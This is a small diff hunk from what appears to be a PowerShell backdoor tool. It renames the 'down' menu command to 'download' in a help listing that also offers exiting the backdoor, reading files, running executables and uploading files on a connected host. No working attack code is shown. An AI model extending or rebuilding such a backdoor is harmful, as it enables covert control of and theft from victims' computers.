@@ -60,7 +60,7 @@ while ($true)
      		write-host "      exitbackdoor: 	input:exit" -fore Green
      		write-host "      read file:    	input:read,then set the file path" -fore Green
      		write-host "      run exe:      	input:run,then set the file path" -fore Green
-     		write-host "      download file:   	input:down,then set the file path" -fore Green
+     		write-host "      download file:   	input:download,then set the file path" -fore Green
      		write-host "      upload file:     	input:upload,then set the file path" -fore Green
      		write-host "Host Connected" -fore Cyan
         $message = '
